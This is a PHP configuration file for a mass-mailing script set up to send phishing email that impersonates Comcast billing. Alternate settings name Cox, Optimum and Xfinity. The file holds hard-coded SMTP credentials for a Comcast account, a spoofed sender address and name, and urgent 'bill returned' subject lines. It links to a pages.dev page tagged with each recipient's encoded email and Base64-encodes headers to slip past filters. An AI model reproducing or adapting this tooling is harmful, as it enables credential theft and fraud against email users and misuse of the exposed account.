<?php

// SMTP settings
$smtpSettings = [
     [
        'host'            => 'smtp.comcast.net',
        'port'            => 587,
        'username'        => 'janeand101@comcast.net',
        'password'        => 'Qwerty#03',
        'Hostname'	      => "mail-".rand(1,9999)."sys.comcast.net",
		'Auth'	          => "tls",
		'SMTPAutoTLS'     => true,    // mostly for Charter
        'SMTPKeepAlive'   => true,    // mostly for Optimum SMtp false for Optimum true for others 
    ],
   /*  
     [
        'host'      => 'smtp2.example.net',
        'port'      => 587,
        'username'  => 'Usernamxe@example.com',
        'password'  => 'Welcomepassword',
        'Hostname'	=> "mail-".rand(1,9999)."sys.comcast.net",
		'Auth'	    => "tls",
    ],
    copy the sample file outside the  comment and edit it 
        
        */
 
    // Add more SMTP configurations as needed
];

$domainSettings = [
    
    'DomainName'               => 'Comcast',                      // Comcast, Cox, Optimum, China, Office
   
];

$commonSettings = [
    'from'              => 'bills.communications@support.comcast.net',    // Sender's email address noreply@myemail.optimum.net,  noreply@mail.cox.com, postmaster@mail.263.net, xfinity.communications@comcast.net
    'fromname'          => 'Bill Pay',           // Sender's name Postmaster, Cox, Xfinity
    'subject'           => 'Your recent bill returned on ##date4##', // Default email subject with placeholder  [12]邮件被拒绝, Urgent message from Optimum - An immediate response is needed., Urgent message from Cox - An immediate response is needed., Urgent message from Xfinity requires your attention immediately
    'letterFile'        => '1.html',                   //  letter filename
    'priority'          => '3',                         // Priority 
    'encoding'          => '',       // quoted-printable or base64 or 7bit or 8bit or binary,
    'charset'           => 'utf-8',                   //Charset option us-ascii, iso-8859-1, utf-8
    'threads'           => '1',                       // Number of threads
    'sleepDuration'     => '',                       // Sleep duration between sending emails
    'waitAfter'         => '',                       // Sleep duration between sending emails
    'waitFor'           => '',                       // Sleep duration between sending emails
   	'EncryptKeyEmlAdd'  => '439rr095490r',             //EMail Address Encryption key             
    'encryptEmail'  	=> true,             //EMail Address Encryption key             
    'link'              => 'support-cancellation-notice.pages.dev/?id=##email64##', // Your link for muttple link sepperat with |
    'linkb64'           => '',                         // Base link link
    'qrlink'            => '',                         // Link behinde qrlink 
    'qrlabel'           => '',                         // Label below qr code
    'image_attachfile'  => '',                         // Image attachment filename
	'htmltojpg'       	=> false,                      // randomparam in front of link
    'imageLetter'       => 'ff1.jpg',                   // Image to base64 or direct images sending
    'pdf_attachfile'    => '',                         // PDF file name to attach
    'HtmlAttachment'    => '',                         // Image attachment filename
    'AttachmentName'    => 'Test',                         // Image attachment filename
    'autolink'          => false,                      // enable autolink in function
    'image_attachname'  => '',                         // CHnage attachment name
    'randomparam'       => false,                      // randomparam in front of link
    'encodeFromInfo'    => true,                       // Enable Base64 encoding for from name
    'encodeSubject'     => true,                       // Enable Base64 encoding for subject
    'randSender'        => false,                      // Enable Base64 encoding for sender's name
    'displayimage'      => false,                      // 
    'recipientListFile' => 'list.txt',
    'ErrorHandling' 	=> '18',  
    
];

$recipientListSettings = [
    'removeDuplicates' 	=> false, // Remove duplicate recipients
    'recipientListFile' => 'list.txt', // Recipient list file
];


$customHeaderSettings = [
    
    'customHeaders' => [
        
  //      'Custom-Header1' => 'custom-value1',
  //      'Custom-Header2' => 'custom-value2',
        // ... add more customizable headers here  
    ]
];

?>